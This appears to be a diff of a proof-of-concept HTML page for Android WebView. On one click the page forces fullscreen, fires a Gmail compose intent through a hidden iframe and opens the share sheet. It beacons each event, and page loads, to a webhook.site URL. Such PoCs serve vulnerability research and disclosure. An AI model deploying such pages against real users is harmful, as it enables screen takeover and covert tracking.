@@ -2,18 +2,18 @@
 <html>
 <head>
 <meta charset="UTF-8">
-<meta charset="UTF-8">
-<title>Fullscreen + Gmail + Web Share PoC</title>
+<title>Android WebView Fullscreen + Gmail + Share PoC</title>
 <style>
-body {
-    font-family: Arial;
+html, body {
+    margin: 0;
+    padding: 0;
+    height: 100%;
+    background-color: #222;
+    color: #fff;
     display: flex;
     justify-content: center;
     align-items: center;
-    height: 100vh;
-    margin: 0;
-    background-color: #222;
-    color: #fff;
+    font-family: Arial, sans-serif;
 }
 button {
     padding: 20px 40px;
@@ -28,7 +28,7 @@ button {
 </head>
 <body>
 
-<button id="fullscreenBtn">Enter Fullscreen & Open Gmail & Share</button>
+<button id="actionBtn">Fullscreen + Share + Gmail Compose</button>
 
 <script>
 const WEBHOOK = "https://webhook.site/893cc168-9c2c-409a-9c79-771f7d62bf3d";
@@ -43,19 +43,26 @@ function report(event) {
     img.src = WEBHOOK + "?d=" + payload;
 }
 
-document.getElementById("fullscreenBtn").addEventListener("click", async () => {
-    report("fullscreen_button_clicked");
+// tombol utama
+document.getElementById("actionBtn").addEventListener("click", async () => {
+    report("button_clicked");
 
-    // 1️⃣ Masuk fullscreen
-    const elem = document.documentElement;
-    if (elem.requestFullscreen) {
-        await elem.requestFullscreen();
-    } else if (elem.webkitRequestFullscreen) { 
-        await elem.webkitRequestFullscreen();
+    // 1️⃣ Fullscreen immersive
+    try {
+        const elem = document.documentElement;
+        if (elem.requestFullscreen) {
+            await elem.requestFullscreen();
+        } else if (elem.webkitRequestFullscreen) {
+            await elem.webkitRequestFullscreen();
+        }
+        document.body.style.overflow = "hidden"; // hide scrollbars
+        report("fullscreen_entered");
+    } catch (e) {
+        report("fullscreen_error");
+        console.log(e);
     }
-    report("fullscreen_entered");
 
-    // 2️⃣ Trigger Gmail compose (intent safe)
+    // 2️⃣ Trigger Gmail compose safely
     try {
         const gmailIntent = "mailto:test@example.com?subject=PoC&body=Testing%20Gmail%20compose";
         const iframe = document.createElement("iframe");
@@ -63,7 +70,7 @@ document.getElementById("fullscreenBtn").addEventListener("click", async () => {
         iframe.src = gmailIntent;
         document.body.appendChild(iframe);
         report("gmail_intent_triggered");
-    } catch (e) {
+    } catch(e) {
         report("gmail_intent_error");
         console.log(e);
     }
@@ -77,7 +84,7 @@ document.getElementById("fullscreenBtn").addEventListener("click", async () => {
                 url: "https://example.com"
             });
             report("share_success");
-        } catch (err) {
+        } catch(err) {
             report("share_cancel_or_error");
             console.log(err);
         }
@@ -86,6 +93,11 @@ document.getElementById("fullscreenBtn").addEventListener("click", async () => {
         report("share_not_supported");
     }
 });
+
+// log page load
+window.onload = () => {
+    report("page_loaded");
+};
 </script>
 
 </body>
